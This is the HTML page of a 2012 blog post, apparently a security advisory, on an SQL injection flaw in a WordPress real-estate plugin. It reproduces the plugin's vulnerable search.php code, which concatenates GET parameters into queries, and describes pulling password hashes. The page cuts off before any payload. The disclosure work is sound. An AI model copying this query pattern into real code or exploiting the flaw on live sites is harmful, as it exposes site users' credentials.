<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="http://ceriksen.com" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>October | 2012 | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->


<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive date  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">
						Monthly Archives: <span>October 2012</span>					</h2>
				</header>

				
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-183" class="post-183 post type-post status-publish format-standard hentry category-advisories tag-firestorm-professional-real-estate-plugin tag-sql-injection tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/" title="1:03 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-25T13:03:30+00:00" pubdate>October 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/25/wordpress-firestorm-professional-real-estate-plugin-sql-injection-vulnerability/" title="Permalink to WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability" rel="bookmark">WordPress FireStorm Professional Real Estate Plugin SQL Injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50873/">Secunia Advisory SA 50873</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The FireStorm Professional Real Estate Plugin for WordPress offers functionality for an user to search for real estate based on a province or country. It is implemented in the file <a href="http://plugins.svn.wordpress.org/fs-real-estate-plugin/tags/2.03/search.php">search.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796a202679976505" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php
require("../../../wp-config.php"); 

if(isset($_GET['ProvinceID'])){
	$FSREPCities = $wpdb-&gt;get_results("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_cities WHERE province_id = ".$_GET['ProvinceID']." ORDER BY city_name");
	$FSREPProvince = $wpdb-&gt;get_row("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_provinces WHERE province_id = ".$_GET['ProvinceID']);
	$HTTPREFERER = explode('?', $_SERVER['HTTP_REFERER']);
	if (substr($HTTPREFERER[0], -13) == '/add-listing/') {
		echo "obj.options[obj.options.length] = new Option('Select ".$FSREPconfig['CityLabel'].",'');\n";
	} else {
		echo "obj.options[obj.options.length] = new Option('Show All of ".$FSREPProvince-&gt;province_name."','');\n";
	}
	$count = 1;
	foreach ($FSREPCities as $FSREPCities) {
		echo "obj.options[obj.options.length] = new Option('".$FSREPCities-&gt;city_name."','".$FSREPCities-&gt;city_id."');\n";
		if ($FSREPCities-&gt;city_id == $_GET['cvalue']) {
			echo "obj.options[$count].selected = true;";
		}
		$count++;
	}
}
if(isset($_GET['CountryID'])){
	$FSREPProvinces = $wpdb-&gt;get_results("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_provinces WHERE country_id = ".$_GET['CountryID']." ORDER BY province_name");
	$FSREPCountry = $wpdb-&gt;get_row("SELECT * FROM ".$wpdb-&gt;prefix."fsrep_countries WHERE country_id = ".$_GET['CountryID']);
	$count = 1;
	echo "obj.options[obj.options.length] = new Option('Select ".$FSREPconfig['ProvinceLabel']."','');\n";
	foreach ($FSREPProvinces as $FSREPProvinces) {
		echo "obj.options[obj.options.length] = new Option('".$FSREPProvinces-&gt;province_name."','".$FSREPProvinces-&gt;province_id."');\n";
		if ($FSREPProvinces-&gt;province_id == $_GET['cvalue']) {
			echo "obj.options[$count].selected = true;";
		}
		$count++;
	}
}

?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987796a202679976505-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-2">2</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-4">4</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-6">6</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-8">8</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-10">10</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-12">12</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-14">14</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-16">16</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-18">18</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-20">20</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-22">22</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-24">24</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-26">26</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-28">28</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-30">30</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-32">32</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-34">34</div><div class="crayon-num" data-line="crayon-53c987796a202679976505-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987796a202679976505-36">36</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987796a202679976505-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-2"><span class="crayon-k ">require</span><span class="crayon-sy">(</span><span class="crayon-s">"../../../wp-config.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987796a202679976505-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPCities</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_cities WHERE province_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">" ORDER BY city_name"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPProvince</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_provinces WHERE province_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$HTTPREFERER</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'?'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'HTTP_REFERER'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-v">$HTTPREFERER</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/add-listing/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Select "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPconfig</span><span class="crayon-sy">[</span><span class="crayon-s">'CityLabel'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">",'');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Show All of "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvince</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPCities</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$FSREPCities</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_id</span><span class="crayon-sy">.</span><span class="crayon-s">"');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPCities</span><span class="crayon-o">-&gt;</span><span class="crayon-i">city_id</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'cvalue'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[$count].selected = true;"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-22"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_provinces WHERE country_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">" ORDER BY province_name"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$FSREPCountry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"fsrep_countries WHERE country_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'CountryID'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('Select "</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPconfig</span><span class="crayon-sy">[</span><span class="crayon-s">'ProvinceLabel'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">"','');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[obj.options.length] = new Option('"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_id</span><span class="crayon-sy">.</span><span class="crayon-s">"');\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$FSREPProvinces</span><span class="crayon-o">-&gt;</span><span class="crayon-i">province_id</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'cvalue'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-s">"obj.options[$count].selected = true;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$count</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-34"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987796a202679976505-35">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987796a202679976505-36"><span class="crayon-ta">?&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0183 seconds] -->
<p>By either providing a ProvinceID or CountryID, we can make the application pass the value into two SQL queries. Note however that in both cases, the value is taken directly from the GET parameter without sanitazion, which opens it up to a SQL injection attack where we can select arbitrary data from the database. For instance, we can select the password hash for an user like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987796a226179608488" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
